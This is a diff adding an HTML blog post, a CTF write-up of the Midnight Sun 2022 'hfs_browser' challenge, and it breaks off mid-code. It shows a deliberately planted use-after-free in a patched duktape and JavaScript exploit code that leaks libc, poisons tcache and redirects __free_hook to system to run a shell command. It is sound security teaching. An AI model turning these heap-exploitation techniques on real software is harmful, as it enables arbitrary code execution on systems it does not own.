@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>hfs_browser -- Midnight Sun CTF 2022 Quals - Pedro Bernardo</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Exploiting a User-After-Free vulnerability in a JavaScript interpreter to get arbitrary code execution!" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="hfs_browser -- Midnight Sun CTF 2022 Quals" />
+<meta property="og:description" content="Exploiting a User-After-Free vulnerability in a JavaScript interpreter to get arbitrary code execution!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/blog/posts/2022-04-03-midnightquals22_hfs_browser/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2022-04-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-04-03T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="hfs_browser -- Midnight Sun CTF 2022 Quals"/>
+<meta name="twitter:description" content="Exploiting a User-After-Free vulnerability in a JavaScript interpreter to get arbitrary code execution!"/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.0db1b638c3c6b12e3f0bf5303b558492d936bf9102ec4c4ba2bdc315e2a4184f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Pedro Bernardo</a>
+	</div>
+	<nav>
+		
+		<a href="/blog">Blog</a>
+		
+		<a href="/blog/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/">CV</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">hfs_browser -- Midnight Sun CTF 2022 Quals</h1>
+			<div class="meta">Posted on Apr 3, 2022</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<!-- raw HTML omitted -->
+<p>Solved with <a href="https://twitter.com/jorge_cmartins">@jorge</a> and <a href="https://twitter.com/s3np41k1r1t0">@s3np41k1r1t0</a>
+ar
+<strong>Points:</strong> dynamic</p>
+<p><strong>Solves:</strong> 20</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h1 id="tldr">TL;DR</h1>
+<ol>
+<li>Find a UAF in the <code>midnight()</code> method for JS typed arrays</li>
+<li>Exploit the UAF to get a libc leak</li>
+<li>Exploit the UAF to perform a tcache poison attack</li>
+<li>Set <code>__free_hook</code> to <code>system</code></li>
+<li>Free a chunk containing <code>cat *la*</code></li>
+<li>Win</li>
+</ol>
+<h1 id="the-problem">The Problem</h1>
+<p>We are given a tar file containing the following:</p>
+<ul>
+<li><code>hfs_browser</code> - the binary</li>
+<li><code>libc-2.31.so, libcurl-gnutls.so.4.6.0&quot;</code> - libraries used remotely</li>
+<li><code>readme.txt</code> - instructions on how to run and debug the binary</li>
+<li><code>duktape.diff</code> - a diff file containing a patch applied by the challenge authors to <code>duktape</code></li>
+</ul>
+<h2 id="hfs_browser">hfs_browser</h2>
+<p>The <code>hfs_browser</code> binary visits a user-provided URL to a JavaScript (JS) file and executes that JS using <a href="https://github.com/svaarala/duktape">duktape</a>, a portable and embeddable Javascript engine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>vagrant@ubuntu-focal:~/shared/midnightQ22/hfs/chall$ checksec hfs_browser
+</span></span><span style="display:flex;"><span>[*] &#39;/home/vagrant/shared/midnightQ22/hfs/chall/hfs_browser&#39;
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x400000)
+</span></span></code></pre></div><h2 id="duktapediff">duktape.diff</h2>
+<p>In <code>duktape.diff</code> the challenge authors modify functions related to typed arrays and garbage collection. Specifically, they do the following modifications:</p>
+<ul>
+<li>builtins.yaml =&gt; add <code>duk_bi_typedarray_midnight</code> to the builtins with key <code>midnight</code></li>
+<li>Implements <code>duk_bi_typedarray_midnight</code> function.</li>
+<li><code>duk_bi_duktape_object_info</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_bi_duktape_object_act</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_bi_duktape_object_gc</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_bi_duktape_object_fin</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_bi_duktape_object_enc</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_bi_duktape_object_dec</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_bi_duktape_object_compact</code> =&gt; replace the body with <code>return 1;</code></li>
+<li><code>duk_heap_mark_and_sweep</code> =&gt; replace the body with <code>return 1;</code></li>
+</ul>
+<h3 id="duk_bi_typedarray_midnight">duk_bi_typedarray_midnight</h3>
+<p><code>duk_bi_typedarray_midnight</code> is the function called when we call <code>Uint8Array.midnight();</code>. Analyzing it, we discovered that it doesn&rsquo;t clear the pointer <code>buf-&gt;curr_alloc</code> after freeing it, leading to <strong>use-after-free</strong> (UAF) and <strong>double-free</strong> vulnerabilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DUK_INTERNAL <span style="color:#ff7b72">duk_ret_t</span> <span style="color:#d2a8ff;font-weight:bold">duk_bi_typedarray_midnight</span>(duk_hthread <span style="color:#ff7b72;font-weight:bold">*</span>thr) {
+</span></span><span style="display:flex;"><span>    duk_hbufobj <span style="color:#ff7b72;font-weight:bold">*</span>h_bufobj <span style="color:#ff7b72;font-weight:bold">=</span> NULL;
+</span></span><span style="display:flex;"><span>    duk_hbuffer_dynamic <span style="color:#ff7b72;font-weight:bold">*</span> buf <span style="color:#ff7b72;font-weight:bold">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    h_bufobj <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">duk__require_bufobj_this</span>(thr);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">DUK_ASSERT</span>(h_bufobj <span style="color:#ff7b72;font-weight:bold">!=</span> NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">DUK_HBUFOBJ_ASSERT_VALID</span>(h_bufobj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    buf <span style="color:#ff7b72;font-weight:bold">=</span> (duk_hbuffer_dynamic<span style="color:#ff7b72;font-weight:bold">*</span>)h_bufobj<span style="color:#ff7b72;font-weight:bold">-&gt;</span>buf;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (buf <span style="color:#ff7b72;font-weight:bold">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (buf<span style="color:#ff7b72;font-weight:bold">-&gt;</span>curr_alloc <span style="color:#ff7b72;font-weight:bold">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">duk_free</span>(thr, buf<span style="color:#ff7b72;font-weight:bold">-&gt;</span>curr_alloc); <span style="color:#8b949e;font-style:italic">// double free
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="debugging">Debugging</h1>
+<p>To verify if we indeed have the UAF, we used the instructions in the <code>readme.txt</code> to clone and patch <code>duktape</code>, and compiled it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/svaarala/duktape -b v2.5-maintenance
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>$ cd duktape
+</span></span><span style="display:flex;"><span>$ patch -p1 &lt; /path/to/duktape.diff
+</span></span><span style="display:flex;"><span>patching file src-input/builtins.yaml
+</span></span><span style="display:flex;"><span>patching file src-input/duk_bi_buffer.c
+</span></span><span style="display:flex;"><span>patching file src-input/duk_bi_duktape.c
+</span></span><span style="display:flex;"><span>patching file src-input/duk_heap_markandsweep.c
+</span></span><span style="display:flex;"><span>$ python2 util/dist.py
+</span></span><span style="display:flex;"><span>$ cd dist
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># add -g to CCOPTS for easy debugging</span>
+</span></span><span style="display:flex;"><span>$ make -f Makefile.cmdline
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>$ ./duk
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">((</span>o<span style="color:#ff7b72;font-weight:bold">)</span> Duktape 2.5.0 <span style="color:#ff7b72;font-weight:bold">(</span>v2.5.0-dirty<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>duk&gt;
+</span></span></code></pre></div><p>And running <code>duk</code> in <code>gdb</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ b  duk_bi_typedarray_midnight      <span style="color:#8b949e;font-style:italic"># before the free</span>
+</span></span><span style="display:flex;"><span>gef➤ b *duk_bi_typedarray_midnight+46   <span style="color:#8b949e;font-style:italic"># after the free</span>
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#a5d6ff">1</span> at 0x555555574f17: file duk_bi_buffer.c, line 2818.
+</span></span><span style="display:flex;"><span>duk&gt; var <span style="color:#79c0ff">a</span> <span style="color:#ff7b72;font-weight:bold">=</span> new Uint8Array<span style="color:#ff7b72;font-weight:bold">(</span>0x1e0<span style="color:#ff7b72;font-weight:bold">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">=</span> undefined
+</span></span><span style="display:flex;"><span>duk&gt; a;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">[</span>object Uint8Array<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>duk&gt; a.midnight<span style="color:#ff7b72;font-weight:bold">()</span>;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>gef➤ heap bins
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Tcachebins<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">idx</span><span style="color:#ff7b72;font-weight:bold">=</span>24, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1a0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">count</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>  ←  Chunk<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">addr</span><span style="color:#ff7b72;font-weight:bold">=</span>0x5555555a3c50, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1a0, <span style="color:#79c0ff">flags</span><span style="color:#ff7b72;font-weight:bold">=</span>PREV_INUSE<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Tcachebins<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">idx</span><span style="color:#ff7b72;font-weight:bold">=</span>42, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x2c0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">count</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>  ←  Chunk<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">addr</span><span style="color:#ff7b72;font-weight:bold">=</span>0x5555555a3fe0, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x2c0, <span style="color:#79c0ff">flags</span><span style="color:#ff7b72;font-weight:bold">=</span>PREV_INUSE<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>gef➤ c
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>gef➤ heap bins
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Tcachebins<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">idx</span><span style="color:#ff7b72;font-weight:bold">=</span>24, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1a0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">count</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>  ←  Chunk<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">addr</span><span style="color:#ff7b72;font-weight:bold">=</span>0x5555555a3c50, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1a0, <span style="color:#79c0ff">flags</span><span style="color:#ff7b72;font-weight:bold">=</span>PREV_INUSE<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Tcachebins<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">idx</span><span style="color:#ff7b72;font-weight:bold">=</span>29, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1f0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">count</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>  ←  Chunk<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">addr</span><span style="color:#ff7b72;font-weight:bold">=</span>0x5555555a3df0, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1f0, <span style="color:#79c0ff">flags</span><span style="color:#ff7b72;font-weight:bold">=</span>PREV_INUSE<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Tcachebins<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">idx</span><span style="color:#ff7b72;font-weight:bold">=</span>42, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x2c0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">count</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>  ←  Chunk<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">addr</span><span style="color:#ff7b72;font-weight:bold">=</span>0x5555555a3fe0, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x2c0, <span style="color:#79c0ff">flags</span><span style="color:#ff7b72;font-weight:bold">=</span>PREV_INUSE<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>gef➤ c
+</span></span><span style="display:flex;"><span>duk&gt; a<span style="color:#ff7b72;font-weight:bold">[</span>0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">=</span> 0x41;
+</span></span><span style="display:flex;"><span>duk&gt; a<span style="color:#ff7b72;font-weight:bold">[</span>1<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">=</span> 0x41;
+</span></span><span style="display:flex;"><span>duk&gt; a<span style="color:#ff7b72;font-weight:bold">[</span>2<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">=</span> 0x41;
+</span></span><span style="display:flex;"><span>duk&gt; a<span style="color:#ff7b72;font-weight:bold">[</span>3<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">=</span> 0x41;
+</span></span><span style="display:flex;"><span>duk&gt; a.midnight<span style="color:#ff7b72;font-weight:bold">()</span>;
+</span></span><span style="display:flex;"><span>gef➤ heap bins
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Tcachebins<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">idx</span><span style="color:#ff7b72;font-weight:bold">=</span>29, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1f0<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">count</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span>  ←
+</span></span><span style="display:flex;"><span>    Chunk<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">addr</span><span style="color:#ff7b72;font-weight:bold">=</span>0x5555555a3df0, <span style="color:#79c0ff">size</span><span style="color:#ff7b72;font-weight:bold">=</span>0x1f0, <span style="color:#79c0ff">flags</span><span style="color:#ff7b72;font-weight:bold">=</span>PREV_INUSE<span style="color:#ff7b72;font-weight:bold">)</span>  ←
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">[</span>Corrupted chunk at 0x41414141<span style="color:#ff7b72;font-weight:bold">]</span> ...
+</span></span></code></pre></div><p>We can also access the <code>fd</code> and <code>bk</code> pointers of freed chunks by indexing the freed array.</p>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="plan">Plan</h2>
+<ol>
+<li>Leak a libc address using the UAF</li>
+<li>Allocate a chunk at <code>__free_hook</code> using Tcache poisoning</li>
+<li>Set <code>__free_hook</code> to <code>system</code> or <code>one_gadget</code></li>
+<li>Free a chunk containing <code>/bin/sh\x00</code></li>
+<li>Win :D</li>
+</ol>
+<h2 id="libc-leak">Libc Leak</h2>
+<p>We created a chunk with size 0x1000, freed it, and read its contents which contained a libc pointer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">function</span> hex(a) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">var</span> result <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">var</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">7</span>; i <span style="color:#ff7b72;font-weight:bold">&gt;=</span> <span style="color:#a5d6ff">0</span>; i<span style="color:#ff7b72;font-weight:bold">--</span>) {
+</span></span><span style="display:flex;"><span>    result <span style="color:#ff7b72;font-weight:bold">+=</span> (<span style="color:#a5d6ff">&#39;0&#39;</span> <span style="color:#ff7b72;font-weight:bold">+</span> a[i].toString(<span style="color:#a5d6ff">16</span>)).slice(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">2</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> result
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> alloc_list(sz, chr) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">var</span> arr <span style="color:#ff7b72;font-weight:bold">=</span> [];
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">var</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> sz; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>      arr.push(chr);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> arr;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>big_list <span style="color:#ff7b72;font-weight:bold">=</span> alloc_list(<span style="color:#a5d6ff">0x1000</span>, <span style="color:#a5d6ff">0x41</span>);
+</span></span><span style="display:flex;"><span>big_list_typed <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint8Array(big_list); <span style="color:#8b949e;font-style:italic">// Create the 0x1000 length chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>big_list_typed.midnight(); <span style="color:#8b949e;font-style:italic">// Frees the typed array
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>libc_leak_str <span style="color:#ff7b72;font-weight:bold">=</span> hex(big_list_typed);
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(libc_leak_str, <span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff7b72;font-weight:bold">=</span> libc_leak <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x1ed350</span>;
+</span></span></code></pre></div><h2 id="tcache-poison">Tcache Poison</h2>
+<p>Many operations influence the heap layout and the bins. Using functions like <code>console.log</code> affected both our leaks, and other operations affected our ability to properly write to the freed chunks.</p>
+<p>After a lot of tweaking, we developed working exploit ([pwn.js]({{ &ldquo;/assets/code/midnightQuals22/hfs_browser/pwn.js&rdquo; | relative_url }})) with the following steps:</p>
+<h4 id="1-allocate-a-chunk-of-size-0x1e0-we-chose-0x1e0-since-the-tcache-for-this-size-was-already-populated-preventing-problems-with-the-chunk-counter">1. Allocate a chunk of size 0x1e0 (we chose 0x1e0 since the Tcache for this size was already populated, preventing problems with the chunk counter)</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>chunk <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint8Array(<span style="color:#a5d6ff">0x1e0</span>);
+</span></span></code></pre></div><h4 id="2-free-the-chunk">2. Free the chunk</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>chunk.midnight();
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Tcachebins[idx=29, size=0x1f0] count=2  ←
+</span></span><span style="display:flex;"><span>    Chunk(addr=0x4c9a80, size=0x1f0, flags=PREV_INUSE)  ←
+</span></span><span style="display:flex;"><span>    Chunk(addr=0x4c5960, size=0x1f0, flags=PREV_INUSE)
+</span></span></code></pre></div><h4 id="3-chunk-fd--__free_hook">3. <code>chunk-&gt;fd = &amp;__free_hook</code></h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>free_hook <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x1eee48</span>;
+</span></span><span style="display:flex;"><span>free_hook_str <span style="color:#ff7b72;font-weight:bold">=</span> free_hook.toString(<span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#a5d6ff">5</span>] <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(free_hook_str.substring(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">2</span>), <span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#a5d6ff">4</span>] <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(free_hook_str.substring(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">2</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">2</span>), <span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#a5d6ff">3</span>] <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(free_hook_str.substring(<span style="color:#a5d6ff">4</span>, <span style="color:#a5d6ff">4</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">2</span>), <span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(free_hook_str.substring(<span style="color:#a5d6ff">6</span>, <span style="color:#a5d6ff">6</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">2</span>), <span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#a5d6ff">1</span>] <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(free_hook_str.substring(<span style="color:#a5d6ff">8</span>, <span style="color:#a5d6ff">8</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">2</span>), <span style="color:#a5d6ff">16</span>);
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> parseInt(free_hook_str.substring(<span style="color:#a5d6ff">10</span>, <span style="color:#a5d6ff">10</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">2</span>), <span style="color:#a5d6ff">16</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Tcachebins[idx=29, size=0x1f0] count=2  ←
+</span></span><span style="display:flex;"><span>    Chunk(addr=0x4c9a70, size=0x1f0, flags=PREV_INUSE)  ←
+</span></span><span style="display:flex;"><span>    Chunk(addr=0x7ffff7ddfe48 /* &amp;__free_hook */, size=0x0, flags=! PREV_INUSE)
+</span></span></code></pre></div><h4 id="4-allocate-a-chunk-and-write-the-command-for-system-cat-la-worked-for-our-exploit">4. Allocate a chunk and write the command for <code>system</code> (<code>cat *la*</code> worked for our exploit)</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>chunk2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint32Array(<span style="color:#a5d6ff">0x78</span>); <span style="color:#8b949e;font-style:italic">// 0x78=0x1e0/4, since we are now using Uint32Array (for no particular reason)
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>chunk2[<span style="color:#a5d6ff">1</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x2a616c2a</span>; <span style="color:#8b949e;font-style:italic">// *la*
